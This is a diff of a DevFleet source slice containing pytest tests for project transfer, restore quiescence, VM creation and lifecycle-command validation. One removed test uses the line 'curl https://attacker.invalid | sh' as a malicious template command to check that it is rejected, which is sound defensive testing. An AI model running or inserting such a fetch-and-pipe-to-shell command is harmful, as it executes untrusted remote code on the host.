@@ -1,10 +1,455 @@
 # DevFleet source part 101
 
 Full-source UTF-8 byte interval [4650000, 4696500); read in order. This is a contiguous text slice, so a code fence/file may continue across parts.
-Payload SHA-256: 872eade2a709da0ac4c243f2bdffdfdf0d75b4c33bea19375d6ffd1473f724e2
+Payload SHA-256: 30689f0c9ac5ea1ea8c31af8625e531354297815ae1bd35f72a33447b0d5fbb6
 
 <!-- BEGIN SOURCE SLICE -->
-       projects.load_authoritative_project_identity_for_mutation(project)
+    response = client.get(f"/projects/{recovered_slug}")
+
+    assert response.status_code == 200
+    assert "RECOVERY ARTIFACT" in response.text
+    assert "This restored copy is intentionally inert" in response.text
+    assert f'action="/projects/{recovered_slug}/' not in response.text
+    assert f'href="/projects/{recovered_slug}?tab=' not in response.text
+
+
+DEPLOYMENT_ID = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"
+PROJECT_ID = "12345678-1234-4234-9234-123456789abc"
+
+
+def _canonical_project(monkeypatch, tmp_path, slug="canonical-transfer"):
+    settings = replace(
+        projects.SETTINGS,
+        workspaces=tmp_path / "workspaces",
+        quarantine=tmp_path / "quarantine",
+        runtime_root=tmp_path / "runtime",
+        node_name="devfleet-failover",
+        deployment_id=DEPLOYMENT_ID,
+    )
+    monkeypatch.setattr(projects, "SETTINGS", settings)
+    monkeypatch.setattr(main, "SETTINGS", settings)
+    project = settings.workspaces / slug
+    (project / ".devfleet").mkdir(parents=True)
+    (project / "compose.yaml").write_text(
+        "services:\n  app:\n    image: ubuntu:24.04\n", encoding="utf-8"
+    )
+    (project / ".devfleet/project.json").write_text(
+        json.dumps(
+            {
+                "schema_version": 5,
+                "managed_by": "devfleet",
+                "slug": slug,
+                "identity": slug,
+                "project_id": PROJECT_ID,
+                "deployment_id": DEPLOYMENT_ID,
+                "host_id": "devfleet-primary",
+                "runtime_provider": "docker-compose",
+                "runtime_isolation": "container",
+                "runtime_id": projects.compose_name(slug),
+                "lifecycle_status": "stopped",
+                "runtime_status": "stopped",
+            }
+        ),
+        encoding="utf-8",
+    )
+    (project / ".devfleet/ownership-lease.json").write_text(
+        json.dumps(
+            {
+                "project_identity": slug,
+                "project_id": PROJECT_ID,
+                "active": False,
+                "active_node": "devfleet-primary",
+                "last_clean_shutdown": "2026-09-16T12:34:56Z",
+            }
+        ),
+        encoding="utf-8",
+    )
+    return settings, project
+
+
+@pytest.mark.parametrize(
+    ("lease_change", "docker_result", "message"),
+    [
+        ({"active": True}, (0, ""), "inactive ownership lease"),
+        ({"active": 0}, (0, ""), "inactive ownership lease"),
+        ({"project_id": "ffffffff-ffff-4fff-8fff-ffffffffffff"}, (0, ""), "inactive ownership lease"),
+        ({"last_clean_shutdown": "not-a-time"}, (0, ""), "verified clean shutdown"),
+        ({}, (1, ""), "Docker quiescence probe failed"),
+        ({}, (0, "container-id\n"), "runtime is still running"),
+    ],
+)
+def test_canonical_restore_quiescence_fails_closed_before_broker(
+    monkeypatch, tmp_path, lease_change, docker_result, message
+):
+    _, project = _canonical_project(monkeypatch, tmp_path)
+    lease_path = project / ".devfleet/ownership-lease.json"
+    lease = json.loads(lease_path.read_text(encoding="utf-8"))
+    lease.update(lease_change)
+    lease_path.write_text(json.dumps(lease), encoding="utf-8")
+    monkeypatch.setattr(
+        projects,
+        "run",
+        lambda *_args, **_kwargs: subprocess.CompletedProcess(
+            _args[0] if _args else [], docker_result[0], docker_result[1], "probe-error"
+        ),
+    )
+    monkeypatch.setattr(
+        projects,
+        "_vault_request",
+        lambda *_args, **_kwargs: (_ for _ in ()).throw(
+            AssertionError("unsafe canonical restore reached Vault broker")
+        ),
+    )
+
+    with pytest.raises((ValueError, RuntimeError), match=message):
+        projects._assert_canonical_restore_quiesced(
+            project.name, expected_project_id=PROJECT_ID
+        )
+
+
+def test_vm_canonical_restore_is_blocked_without_runtime_or_broker_probe(
+    monkeypatch, tmp_path
+):
+    _, project = _canonical_project(monkeypatch, tmp_path)
+    metadata_path = project / ".devfleet/project.json"
+    metadata = json.loads(metadata_path.read_text(encoding="utf-8"))
+    metadata.update(
+        {
+            "runtime_provider": "multipass-host-agent",
+            "runtime_isolation": "vm",
+            "runtime_id": "devfleet-project-canonical-transfer",
+        }
+    )
+    metadata_path.write_text(json.dumps(metadata), encoding="utf-8")
+    forbidden = lambda *_args, **_kwargs: (_ for _ in ()).throw(
+        AssertionError("VM canonical restore probed a runtime or Vault broker")
+    )
+    monkeypatch.setattr(projects, "run", forbidden)
+    monkeypatch.setattr(projects, "_vault_request", forbidden)
+
+    with pytest.raises(ValueError, match="stopped-VM attestation"):
+        projects._assert_canonical_restore_quiesced(
+            project.name, expected_project_id=PROJECT_ID
+        )
+
+
+def _restore_transfer_fixture(
+    project: Path, source_slug: str, *, source_host="devfleet-primary"
+):
+    (project / ".devfleet").mkdir(parents=True, exist_ok=True)
+    (project / "compose.yaml").write_text(
+        "services:\n  app:\n    image: ubuntu:24.04\n", encoding="utf-8"
+    )
+    (project / ".devfleet/project.json").write_text(
+        json.dumps(
+            {
+                "schema_version": 5,
+                "managed_by": "devfleet",
+                "slug": source_slug,
+                "identity": source_slug,
+                "project_id": PROJECT_ID,
+                "deployment_id": DEPLOYMENT_ID,
+                "host_id": source_host,
+                "runtime_provider": "docker-compose",
+                "runtime_isolation": "container",
+                "runtime_id": projects.compose_name(source_slug),
+                "lifecycle_status": "stopped",
+                "runtime_status": "stopped",
+            }
+        ),
+        encoding="utf-8",
+    )
+    (project / ".devfleet/ownership-lease.json").write_text(
+        json.dumps(
+            {
+                "project_identity": source_slug,
+                "project_id": PROJECT_ID,
+                "active": False,
+                "active_node": source_host,
+                "last_clean_shutdown": "2026-09-16T12:34:56Z",
+            }
+        ),
+        encoding="utf-8",
+    )
+
+
+def _received_pending_transfer_fixture(monkeypatch, tmp_path, slug):
+    settings = replace(
+        projects.SETTINGS,
+        workspaces=tmp_path / "workspaces",
+        runtime_root=tmp_path / "runtime",
+        quarantine=tmp_path / "quarantine",
+        node_name="devfleet-failover",
+        deployment_id=DEPLOYMENT_ID,
+    )
+    settings.workspaces.mkdir()
+    monkeypatch.setattr(projects, "SETTINGS", settings)
+    project = settings.workspaces / slug
+    staging = settings.workspaces / f"{slug}-recovered-20260916-123456-deadbeef"
+    control = {"fail_start": False, "fail_hook": False, "calls": []}
+
+    def runner(args, **_kwargs):
+        command = list(args)
+        control["calls"].append(command)
+        if control["fail_start"] and "up" in command:
+            raise RuntimeError("injected destination start failure")
+        return subprocess.CompletedProcess(command, 0, "", "")
+
+    def restore(*_args, **_kwargs):
+        _restore_transfer_fixture(staging, slug)
+        return {
+            "ok": True,
+            "action": "restore-transfer",
+            "project": slug,
+            "project_id": PROJECT_ID,
+            "deployment_id": DEPLOYMENT_ID,
+            "source_host_id": "devfleet-primary",
+            "target": str(staging),
+        }
+
+    def hook(*_args):
+        if control["fail_hook"]:
+            raise RuntimeError("injected destination hook failure")
+        return ""
+
+    monkeypatch.setattr(projects, "run", runner)
+    monkeypatch.setattr(projects, "_vault_request", restore)
+    monkeypatch.setattr(projects, "_assert_current_compose_safety", lambda *_args: None)
+    monkeypatch.setattr(projects, "_hook", hook)
+    projects.receive_transferred_project(
+        slug,
+        PROJECT_ID,
+        DEPLOYMENT_ID,
+        "devfleet-primary",
+        "devfleet-failover",
+    )
+    return project, control
+
+
+def _assert_pending_transfer_state(project):
+    metadata = json.loads(
+        (project / ".devfleet/project.json").read_text(encoding="utf-8")
+    )
+    lease = json.loads(
+        (project / ".devfleet/ownership-lease.json").read_text(encoding="utf-8")
+    )
+    assert metadata["transfer_state"] == "pending-source-finalization"
+    assert metadata["lifecycle_status"] == "ownership-transfer-pending"
+    assert metadata["runtime_status"] == "stopped"
+    assert lease["project_id"] == PROJECT_ID
+    assert lease["active"] is False
+    assert lease["active_node"] == "devfleet-failover"
+    assert projects._transfer_pending_marker_path(project).is_file()
+    with pytest.raises(ValueError, match="awaits source finalization"):
+        projects.load_authoritative_project_identity_for_mutation(project)
+
+
+def test_receive_transfer_restores_absent_project_and_rebinds_destination(
+    monkeypatch, tmp_path
+):
+    settings = replace(
+        projects.SETTINGS,
+        workspaces=tmp_path / "workspaces",
+        runtime_root=tmp_path / "runtime",
+        node_name="devfleet-failover",
+        deployment_id=DEPLOYMENT_ID,
+    )
+    settings.workspaces.mkdir()
+    monkeypatch.setattr(projects, "SETTINGS", settings)
+    monkeypatch.setattr(
+        projects,
+        "run",
+        lambda args, **_kwargs: subprocess.CompletedProcess(args, 0, "", ""),
+    )
+    slug = "received-project"
+    project = settings.workspaces / slug
+    staging = settings.workspaces / f"{slug}-recovered-20260916-123456-deadbeef"
+
+    def restore(
+        action,
+        received_slug,
+        received_id,
+        *,
+        timeout,
+        deployment_id,
+        source_host_id,
+    ):
+        assert (action, received_slug, received_id, deployment_id, source_host_id) == (
+            "restore-transfer",
+            slug,
+            PROJECT_ID,
+            DEPLOYMENT_ID,
+            "devfleet-primary",
+        )
+        _restore_transfer_fixture(staging, slug)
+        return {
+            "ok": True,
+            "action": action,
+            "project": slug,
+            "project_id": PROJECT_ID,
+            "deployment_id": DEPLOYMENT_ID,
+            "source_host_id": "devfleet-primary",
+            "target": str(staging),
+        }
+
+    monkeypatch.setattr(projects, "_vault_request", restore)
+
+    result = projects.receive_transferred_project(
+        slug,
+        PROJECT_ID,
+        DEPLOYMENT_ID,
+        "devfleet-primary",
+        "devfleet-failover",
+    )
+
+    metadata = json.loads((project / ".devfleet/project.json").read_text())
+    lease = json.loads((project / ".devfleet/ownership-lease.json").read_text())
+    ownership = projects.ownership_override_path(project).read_text(encoding="utf-8")
+    assert result["state"] == "handoff-pending"
+    assert metadata["host_id"] == "devfleet-failover"
+    assert metadata["runtime_id"] == projects.compose_name(slug)
+    assert metadata["transfer_state"] == "pending-source-finalization"
+    assert metadata["lifecycle_status"] == "ownership-transfer-pending"
+    assert lease["active"] is False and lease["active_node"] == "devfleet-failover"
+    assert "devfleet-failover" in ownership and "devfleet-primary" not in ownership
+    assert projects._transfer_pending_marker_path(project).is_file()
+    with pytest.raises(ValueError, match="awaits source finalization"):
+        projects.start_project(slug, override_failover=True)
+
+    monkeypatch.setattr(projects, "_assert_current_compose_safety", lambda *_args: None)
+    monkeypatch.setattr(projects, "_hook", lambda *_args: "")
+    activated = projects.activate_transferred_project(
+        slug,
+        PROJECT_ID,
+        DEPLOYMENT_ID,
+        "devfleet-primary",
+        "devfleet-failover",
+    )
+    metadata = json.loads((project / ".devfleet/project.json").read_text())
+    lease = json.loads((project / ".devfleet/ownership-lease.json").read_text())
+    assert activated["state"] == "activated-running"
+    assert metadata["transfer_state"] == "completed"
+    assert metadata["lifecycle_status"] == "running"
+    assert lease["active"] is True and lease["active_node"] == "devfleet-failover"
+    assert not projects._transfer_pending_marker_path(project).exists()
+
+
+@pytest.mark.parametrize(
+    ("failure_key", "failure_message"),
+    [
+        ("fail_start", "injected destination start failure"),
+        ("fail_hook", "injected destination hook failure"),
+    ],
+)
+def test_activation_startup_failure_retains_pending_authority_and_is_retryable(
+    monkeypatch, tmp_path, failure_key, failure_message
+):
+    project, control = _received_pending_transfer_fixture(
+        monkeypatch, tmp_path, f"{failure_key.replace('_', '-')}-transfer"
+    )
+    control[failure_key] = True
+
+    with pytest.raises(RuntimeError, match=failure_message):
+        projects.activate_transferred_project(
+            project.name,
+            PROJECT_ID,
+            DEPLOYMENT_ID,
+            "devfleet-primary",
+            "devfleet-failover",
+        )
+
+    _assert_pending_transfer_state(project)
+    assert any(command[-2:] == ["down", "--remove-orphans"] for command in control["calls"])
+
+    control[failure_key] = False
+    activated = projects.activate_transferred_project(
+        project.name,
+        PROJECT_ID,
+        DEPLOYMENT_ID,
+        "devfleet-primary",
+        "devfleet-failover",
+    )
+    assert activated["state"] == "activated-running"
+    assert not projects._transfer_pending_marker_path(project).exists()
+
+
+def test_post_start_commit_failure_restores_pending_authority_and_is_retryable(
+    monkeypatch, tmp_path
+):
+    project, control = _received_pending_transfer_fixture(
+        monkeypatch, tmp_path, "commit-failure-transfer"
+    )
+    remove_pending = projects._remove_transfer_pending
+    failure = {"armed": True}
+
+    def fail_after_marker_removal(current_project, expected):
+        remove_pending(current_project, expected)
+        if failure["armed"]:
+            failure["armed"] = False
+            raise RuntimeError("injected post-start activation commit failure")
+
+    monkeypatch.setattr(projects, "_remove_transfer_pending", fail_after_marker_removal)
+
+    with pytest.raises(RuntimeError, match="injected post-start activation commit failure"):
+        projects.activate_transferred_project(
+            project.name,
+            PROJECT_ID,
+            DEPLOYMENT_ID,
+            "devfleet-primary",
+            "devfleet-failover",
+        )
+
+    _assert_pending_transfer_state(project)
+    assert any(command[-2:] == ["down", "--remove-orphans"] for command in control["calls"])
+
+    activated = projects.activate_transferred_project(
+        project.name,
+        PROJECT_ID,
+        DEPLOYMENT_ID,
+        "devfleet-primary",
+        "devfleet-failover",
+    )
+    assert activated["state"] == "activated-running"
+    assert not projects._transfer_pending_marker_path(project).exists()
+
+
+@pytest.mark.parametrize(
+    ("pending_field", "pending_value"),
+    [
+        ("transfer_state", "pending-source-finalization"),
+        ("lifecycle_status", "ownership-transfer-pending"),
+    ],
+)
+def test_pending_transfer_metadata_denies_mutation_when_marker_is_deleted(
+    monkeypatch, tmp_path, pending_field, pending_value
+):
+    settings, project = _canonical_project(
+        monkeypatch, tmp_path, slug=f"markerless-{pending_field.replace('_', '-')}"
+    )
+    metadata_path = project / ".devfleet/project.json"
+    metadata = json.loads(metadata_path.read_text(encoding="utf-8"))
+    metadata[pending_field] = pending_value
+    metadata_path.write_text(json.dumps(metadata), encoding="utf-8")
+    projects._record_transfer_pending(
+        project,
+        project_id=PROJECT_ID,
+        deployment_id=DEPLOYMENT_ID,
+        source_host_id="devfleet-primary",
+        destination_host_id="devfleet-failover",
+    )
+    marker_path = projects._transfer_pending_marker_path(project)
+    marker_path.unlink()
+    assert not marker_path.exists()
+    monkeypatch.setattr(
+        projects,
+        "run",
+        lambda *_args, **_kwargs: (_ for _ in ()).throw(
+            AssertionError("markerless pending transfer reached runtime mutation")
+        ),
+    )
+
+    with pytest.raises(ValueError, match="awaits source finalization"):
+        projects.load_authoritative_project_identity_for_mutation(project)
     with pytest.raises(ValueError, match="awaits source finalization"):
         projects.start_project(project.name, override_failover=True)
 
@@ -738,308 +1183,4 @@ def test_generated_symlink_directory_is_excluded_from_workspace_archive(tmp_path
     assert "node_modules" in result["generated_dirs"]
     with tarfile.open(archive, "r:gz") as handle:
         names = handle.getnames()
-    assert f"{slug}/src/main.js" in names
-    assert not any("node_modules" in name for name in names)
-
-
-def test_host_agent_backup_and_export_share_generated_directory_exclusions():
-    source = (ROOT / "windows/DevFleet-HostAgent.ps1").read_text(encoding="utf-8")
-    assert "function New-VerifiedRemoteWorkspaceArchive" in source
-    assert 'excluded = {"node_modules", ".next", "build", "dist", ".venv", "venv", ".pytest_cache", "__pycache__", ".test-runtime"}' in source
-    assert source.count("New-VerifiedRemoteWorkspaceArchive $Record.vm_name $remoteArchive") >= 2
-    assert all(operation in source for operation in ("'list-backups'", "'inspect-backup'", "'restore-backup'"))
-
-```
-
-
-## FILE: source/tests/test_v124_vm_creation_ssh.py
-
-SHA256: 705b439b834162d0890b8b4b4bb42ed66dc300e76b409de537520323dd8ebe6c | Bytes: 6592 | Git mode: 100644
-
-```
-import json
-import shutil
-import uuid
-from pathlib import Path
-
-import pytest
-
-import devfleet.projects as projects
-from devfleet.core import SETTINGS
-
-
-def _template(project: Path, _name: str) -> None:
-    control = project / ".devfleet"
-    control.mkdir(parents=True, exist_ok=True)
-    (control / "template.json").write_text(json.dumps({
-        "bootstrap_command": "./.devfleet/bootstrap.sh",
-        "health_command": "./.devfleet/health-check.sh",
-        "test_command": "./.devfleet/smoke-test.sh",
-    }), encoding="utf-8")
-
-
-def _template_metadata(_name: str) -> dict:
-    return {"language": "python", "framework": "fastapi", "language_rationale": "test", "template_maturity": "stable"}
-
-
-def _prepare(monkeypatch: pytest.MonkeyPatch) -> None:
-    monkeypatch.setattr(projects, "_copy_template", _template)
-    monkeypatch.setattr(projects, "template_metadata", _template_metadata)
-
-
-def test_vm_create_returns_coherent_metadata_and_syncs_host_alias(monkeypatch: pytest.MonkeyPatch):
-    slug = f"v124-vm-create-{uuid.uuid4().hex[:8]}"
-    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
-    _prepare(monkeypatch)
-    calls: list[tuple] = []
-    runtime_id = f"devfleet-project-{slug}"
-    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda _slug, _meta: {"runtime_id": runtime_id, "address": "10.0.0.44", "state": "ready"}))
-    monkeypatch.setattr(projects, "import_project_workspace", lambda *_args, **_kwargs: {"ok": True, "workspace_preserved": True, "address": "10.0.0.44"})
-    monkeypatch.setattr(projects, "sync_project_vm_ssh_alias", lambda slug, runtime_id, *, project_id: calls.append((slug, runtime_id, project_id)) or {"validated": True})
-
-    result = projects.create_project(slug, template="generic", runtime_isolation="vm", use_ollama=False)
-
-    for key in ("project_id", "slug", "runtime_isolation", "runtime_provider", "runtime_id", "runtime_address", "ssh_alias", "workspace_host", "workspace_path", "resource_profile", "resource_limits", "provisioning_status", "lifecycle_status", "health_status", "health_scope"):
-        assert key in result
-    assert result["runtime_isolation"] == "vm"
-    assert result["runtime_provider"] == "multipass-host-agent"
-    assert result["runtime_id"] == result["ssh_alias"] == runtime_id
-    assert result["runtime_address"] == result["workspace_host"] == "10.0.0.44"
-    assert result["provisioning_status"] == result["lifecycle_status"] == "ready"
-    assert result["health_status"] == "unknown"
-    assert result["health_scope"] == "workspace-ready-not-app-healthy"
-    assert calls == [(slug, result["runtime_id"], result["project_id"])]
-    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
-
-
-def test_container_create_returns_metadata(monkeypatch: pytest.MonkeyPatch):
-    slug = f"v124-container-create-{uuid.uuid4().hex[:8]}"
-    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
-    _prepare(monkeypatch)
-
-    result = projects.create_project(slug, template="generic", runtime_isolation="container", use_ollama=False)
-
-    assert isinstance(result, dict)
-    assert result["slug"] == slug
-    assert result["runtime_isolation"] == "container"
-    assert result["runtime_provider"] == "docker-compose"
-    assert result["provisioning_status"] == result["lifecycle_status"] == "ready"
-    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
-
-
-def test_worktree_to_vm_is_rejected_before_provider_ensure(monkeypatch: pytest.MonkeyPatch):
-    token = uuid.uuid4().hex[:8]
-    source_slug, destination_slug = f"v124-worktree-source-{token}", f"v124-worktree-vm-{token}"
-    source, destination = SETTINGS.workspaces / source_slug, SETTINGS.workspaces / destination_slug
-    shutil.rmtree(source, ignore_errors=True)
-    shutil.rmtree(destination, ignore_errors=True)
-    (source / ".git").mkdir(parents=True)
-    ensured: list[object] = []
-    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda *_args: ensured.append(True)))
-
-    with pytest.raises(ValueError, match="Worktree-to-VM provisioning is blocked"):
-        projects.create_project(destination_slug, template="generic", runtime_isolation="vm", worktree_source=source_slug, worktree_branch="feature", use_ollama=False)
-
-    assert ensured == []
-    assert not destination.exists()
-    shutil.rmtree(source, ignore_errors=True)
-
-
-def test_host_control_alias_operation_is_fixed_and_structured(monkeypatch: pytest.MonkeyPatch):
-    import devfleet.host_control as host_control
-
-    received: dict = {}
-    monkeypatch.setattr(host_control, "host_control_request", lambda operation, payload, *, runtime_id: received.update(operation=operation, payload=payload, runtime_id=runtime_id) or {"ok": True})
-
-    assert host_control.sync_project_vm_ssh_alias("v124-alias", "devfleet-project-v124-alias", project_id="12345678-1234-1234-1234-123456789abc") == {"ok": True}
-    assert received == {"operation": "sync-ssh-alias", "payload": {"slug": "v124-alias", "project_id": "12345678-1234-1234-1234-123456789abc"}, "runtime_id": "devfleet-project-v124-alias"}
-
-
-def test_host_agent_readiness_probe_runs_with_required_privilege():
-    root = Path(__file__).resolve().parents[1]
-    script = (root / "windows" / "DevFleet-HostAgent.ps1").read_text(encoding="utf-8")
-
-    assert "@('exec',$VmName,'--','sudo','/usr/local/sbin/devfleet-project-health')" in script
-    assert "@('exec',$SourceVm,'--','sudo','tar','-czf',$sourceArchive" in script
-    assert "@('exec',$record.vm_name,'--','sudo','find',$targetPath" in script
-    assert "@('exec',$Record.vm_name,'--','sudo','-u','devrunner','bash','--noprofile','--norc','-lc'" in script
-    assert "exec $cmd" in script
-    assert "workspace boundary validation failed" in script
-    assert '$keyProperty="    ssh_authorized_keys:`n      - \'$key\'"' in script
-    assert "Configured DevFleet SSH public key is not available" in script
-
-
-def test_vm_runtime_compatibility_facade_routes_trusted_commands(monkeypatch: pytest.MonkeyPatch):
-    import devfleet.runtime as runtime
-
-    received: dict = {}
-    monkeypatch.setattr(runtime.VM_RUNTIME, "command", lambda slug, metadata, operation, *, command_key="", tail=150: received.update(slug=slug, metadata=metadata, operation=operation, command_key=command_key, tail=tail) or {"ok": True})
-
-    assert runtime.VmRuntimeOperations.command("demo", {"project_id": "id"}, "project-test", command_key="test", tail=42) == {"ok": True}
-    assert received == {"slug": "demo", "metadata": {"project_id": "id"}, "operation": "project-test", "command_key": "test", "tail": 42}
-
-```
-
-
-## FILE: source/tests/test_v125_jobfinder_hotfix.py
-
-SHA256: f8f3e5ce386a3ce3b8c85a0514a09bbb702e935f716e4cd5e8b3c98e44f3b0da | Bytes: 12515 | Git mode: 100644
-
-```
-import json
-from pathlib import Path
-
-import pytest
-
-import devfleet.projects as projects
-from devfleet import host_control, main
-from devfleet.core import SETTINGS
-
-
-LIFECYCLE = {
-    "start_command": "docker compose up -d --build",
-    "stop_command": "docker compose down --remove-orphans",
-    "restart_command": "docker compose restart",
-    "rebuild_command": "docker compose build && docker compose up -d",
-    "logs_command": "docker compose logs",
-}
-PROJECT_ID = "12345678-1234-1234-1234-123456789abc"
-
-
-def _legacy_project(slug: str, template_root: Path, *, exact: bytes | None = None) -> Path:
-    project = SETTINGS.workspaces / slug
-    (project / ".devfleet").mkdir(parents=True, exist_ok=True)
-    (project / "compose.yaml").write_text("services:\n  app:\n    image: ubuntu:24.04\n", encoding="utf-8")
-    metadata = {
-        "schema_version": 2,
-        "managed_by": "devfleet",
-        "slug": slug,
-        "identity": slug,
-        "project_id": PROJECT_ID,
-        "host_id": SETTINGS.node_name,
-        "template": "typescript-next",
-        "runtime_isolation": "container",
-        "runtime_type": "container",
-        "runtime_provider": "docker-compose",
-        "resource_profile": "small",
-        "lifecycle_status": "stopped",
-        "bootstrap_command": "./.devfleet/bootstrap.sh",
-        "health_command": "./.devfleet/health-check.sh",
-    }
-    payload = exact if exact is not None else json.dumps(metadata, separators=(",", ":")).encode()
-    (project / ".devfleet" / "project.json").write_bytes(payload)
-    (project / ".devfleet" / "template.json").write_text(json.dumps({"id": "typescript-next"}), encoding="utf-8")
-    canonical = template_root / "typescript-next" / ".devfleet"
-    canonical.mkdir(parents=True, exist_ok=True)
-    (canonical / "template.json").write_text(json.dumps({"id": "typescript-next", **LIFECYCLE}), encoding="utf-8")
-    return project
-
-
-def _migration_mocks(monkeypatch: pytest.MonkeyPatch, slug: str, *, source_running: bool = False):
-    calls: list[str] = []
-    monkeypatch.setattr(projects, "running", lambda _project: source_running)
-    monkeypatch.setattr(projects, "backup_project", lambda _slug: json.dumps({"backup_status": "verified", "backup_id": "provider-backup", "backup_sha256": "a" * 64}))
-    monkeypatch.setattr(projects, "get_host_capacity", lambda: {"capacity": {"allocatable_cpus": 8, "allocatable_memory_gb": 24, "allocatable_disk_gb": 300}})
-    monkeypatch.setattr(projects, "sync_project_vm_ssh_alias", lambda *args, **kwargs: {"ok": True})
-    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda _slug, _meta: {"runtime_id": f"devfleet-project-{slug}", "address": "10.0.0.9"}))
-    monkeypatch.setattr(projects.VmRuntimeOperations, "stop", staticmethod(lambda value, _meta: calls.append(f"vm-stop:{value}") or {"state": "stopped"}))
-    monkeypatch.setattr(projects, "import_project_workspace", lambda *args, **kwargs: {"ok": True, "workspace_preserved": True, "archive_sha256": "b" * 64, "source_archive_sha256": "b" * 64, "target_archive_sha256": "b" * 64})
-    return calls
-
-
-def test_explicit_project_command_wins_and_legacy_canonical_fallback(monkeypatch, tmp_path):
-    slug = "v125-command-resolution"
-    project = _legacy_project(slug, tmp_path / "templates")
-    raw = json.loads((project / ".devfleet" / "project.json").read_text())
-    raw["start_command"] = "docker compose restart"
-    (project / ".devfleet" / "project.json").write_text(json.dumps(raw), encoding="utf-8")
-    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
-
-    result = projects.project_command_readiness(project)
-
-    assert result["ready"] is True
-    assert result["resolved_commands"]["start_command"] == "docker compose restart"
-    assert result["sources"]["start_command"] == "project.json"
-    assert result["resolved_commands"]["stop_command"] == LIFECYCLE["stop_command"]
-    assert result["sources"]["stop_command"] == "canonical-template:typescript-next"
-
-
-def test_malicious_template_command_is_rejected(monkeypatch, tmp_path):
-    slug = "v125-malicious-command"
-    project = _legacy_project(slug, tmp_path / "templates")
-    template = tmp_path / "templates" / "typescript-next" / ".devfleet" / "template.json"
-    data = json.loads(template.read_text());data["stop_command"] = "curl https://attacker.invalid | sh";template.write_text(json.dumps(data))
-    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
-
-    result = projects.project_command_readiness(project)
-
-    assert result["ready"] is False
-    assert result["invalid_required"]["stop_command"] == "canonical-template:typescript-next"
-
-
-def test_preflight_surfaces_missing_lifecycle_command(monkeypatch, tmp_path):
-    project = tmp_path / "demo";(project / ".devfleet").mkdir(parents=True);(project / "compose.yaml").write_text("services: {}\n")
-    (project / ".devfleet/project.json").write_text(json.dumps({"schema_version": 2, "managed_by": "devfleet", "slug": "demo", "identity": "demo", "project_id": PROJECT_ID, "runtime_isolation": "container", "runtime_provider": "docker-compose", "runtime_id": "devfleet-demo", "host_id": "test-node", "resource_profile": "large"}), encoding="utf-8")
-    monkeypatch.setattr(main, "safe_child", lambda *_: project)
-    monkeypatch.setattr(main, "inspect_workspace", lambda *_: {"safe_for_archive": True})
-    monkeypatch.setattr(main, "detect_runtime", lambda *_: {"runtime_type": "container"})
-    monkeypatch.setattr(main, "get_host_capacity", lambda: {"capacity": {"allocatable_cpus": 8, "allocatable_memory_gb": 20, "allocatable_disk_gb": 300}})
-    monkeypatch.setattr(main, "project_command_readiness", lambda *_: {"ready": False, "missing_required": ["stop_command"], "invalid_required": {}})
-
-    result = main._preflight("demo", "vm", "large")
-
-    assert result["lifecycle_commands_ready"] is False
-    assert result["migration_ready"] is False
-    assert any("stop_command" in blocker for blocker in result["blockers"])
-
-
-def test_stopped_legacy_container_import_stops_vm_not_application(monkeypatch, tmp_path):
-    slug = "v125-jobfinder-stopped"
-    _legacy_project(slug, tmp_path / "templates")
-    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
-    calls = _migration_mocks(monkeypatch, slug, source_running=False)
-    monkeypatch.setattr(projects, "stop_project", lambda *_: pytest.fail("stopped-source path must not invoke application stop"))
-
-    result = projects.assign_project_runtime(slug, "vm", "small")
-    saved = projects.load_meta(SETTINGS.workspaces / slug)
-
-    assert result["application_health"] == "not-run-stopped"
-    assert calls == [f"vm-stop:{slug}"]
-    assert saved["lifecycle_status"] == "stopped"
-    assert all(saved[key] == value for key, value in LIFECYCLE.items())
-
-
-def test_running_container_still_uses_start_and_health_workflow(monkeypatch, tmp_path):
-    slug = "v125-running-workflow"
-    project = _legacy_project(slug, tmp_path / "templates")
-    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
-    calls = _migration_mocks(monkeypatch, slug, source_running=True)
-    monkeypatch.setattr(projects, "stop_project", lambda value: calls.append(f"source-stop:{value}") or "stopped")
-
-    def start(value):
-        calls.append(f"destination-start:{value}")
-        meta = projects.load_meta(project);meta["lifecycle_status"] = "running";meta["health_status"] = "healthy";projects.atomic_json(projects.metadata_path(project), meta)
-        return "started"
-
-    monkeypatch.setattr(projects, "start_project", start)
-    monkeypatch.setattr(projects, "runtime_health", lambda *_: {"ok": True, "healthy": True})
-    monkeypatch.setattr(projects, "health_project", lambda *_: "healthy")
-
-    result = projects.assign_project_runtime(slug, "vm", "small")
-
-    assert result["application_health"] == "healthy"
-    assert f"source-stop:{slug}" in calls and f"destination-start:{slug}" in calls
-    assert not any(call.startswith("vm-stop:") for call in calls)
-
-
-def test_rollback_restores_legacy_metadata_bytes_exactly(monkeypatch, tmp_path):
-    slug = "v125-exact-rollback"
-    template_root = tmp_path / "templates"
-    project = _legacy_project(slug, template_root)
-    original = (project / ".devfleet" / "project.json").read_bytes()
-    monkeypatch.setattr(projects, "TEMPLATE_ROOT", template_root)
-    _migration_mocks(monkeypatch, slug)
-    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda *_: (_ for _ in ()).throw(RuntimeError("injected provision failure"))))
-
-    with pytest.raises(RuntimeError, match="injected provision failure"):
-        projects.assign
+    assert f"{slug}/src/main.js" in nam
